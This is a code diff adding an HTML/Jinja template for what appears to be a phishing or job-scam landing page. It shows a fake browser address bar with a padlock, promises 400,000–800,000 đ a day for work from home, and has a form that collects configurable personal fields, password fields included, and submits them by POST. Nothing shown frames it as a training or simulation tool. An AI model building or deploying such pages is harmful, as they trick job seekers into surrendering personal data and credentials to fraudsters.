@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ data.form_title }}</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #eaeff2;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            padding: 40px 10px;
+        }
+
+        .wrapper {
+            background: white;
+            width: 100%;
+            max-width: 600px;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
+        }
+
+        .hero {
+            background: #c62828;
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+
+        .hero h1 {
+            margin: 0;
+            font-size: 24px;
+        }
+
+        .hero p {
+            margin: 10px 0 0;
+            font-size: 16px;
+            opacity: 0.9;
+        }
+
+        .url-bar {
+            background: #f8f9fa;
+            padding: 10px;
+            text-align: center;
+            font-family: monospace;
+            color: #666;
+            font-size: 13px;
+            border-bottom: 1px solid #ddd;
+        }
+
+        form {
+            padding: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .form-group input[type="text"],
+        .form-group input[type="email"],
+        .form-group input[type="tel"],
+        .form-group input[type="number"],
+        .form-group input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ced4da;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 15px;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 15px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+
+        .btn-submit:hover {
+            background-color: #218838;
+        }
+
+        .hidden-data {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="wrapper">
+
+        <div class="url-bar">
+            🔒 {{ data.fake_url_display }}
+        </div>
+
+        <div class="hero">
+            <h1>{{ data.title }}</h1>
+            <p>
+                Thu nhập 400.000đ - 800.000đ / Ngày.
+                Làm việc linh hoạt tại nhà.
+            </p>
+        </div>
+
+        <form method="POST" onsubmit="return validateForm()">
+
+            {% for field in data.inputs %}
+
+            <div class="form-group">
+
+                <label>
+                    {{ field.name }}
+                </label>
+
+                <input
+                    type="{{ field.type }}"
+                    name="field_{{ loop.index0 }}"
+                    id="field_{{ loop.index0 }}"
+                    required
+                    placeholder="Nhập {{ field.name|lower }}"
+                >
+
+                <input
+                    type="hidden"
+                    class="pattern-data"
+                    id="pattern_{{ loop.index0 }}"
+                    value="{{ field.pattern }}"
+                >
+
+                <input
+                    type="hidden"
+                    class="message-data"
+                    id="msg_{{ loop.index0 }}"
+                    value="{{ field.msg }}"
+                >
+
+            </div>
+
+            {% endfor %}
+
+            <button type="submit" class="btn-submit">
+                ĐĂNG KÝ ỨNG TUYỂN
+            </button>
+
+        </form>
+    </div>
+
+
+    <script>
+        function validateForm() {
+
+            const patternInputs = document.querySelectorAll(".pattern-data");
+            const messageInputs = document.querySelectorAll(".message-data");
+
+            for (let i = 0; i < patternInputs.length; i++) {
+
+                const field = document.getElementById("field_" + i);
+
+                if (!field) {
+                    continue;
+                }
+
+                const value = field.value.trim();
+                const patternText = patternInputs[i].value;
+                const message = messageInputs[i].value;
+
+                try {
+
+                    const pattern = new RegExp(patternText);
+
+                    if (!pattern.test(value)) {
+                        alert(message);
+                        field.focus();
+                        return false;
+                    }
+
+                } catch (error) {
+
+                    console.error("Lỗi biểu thức chính quy:", error);
+                    return false;
+
+                }
+            }
+
+            return true;
+        }
+    </script>
+
+</body>
+</html>
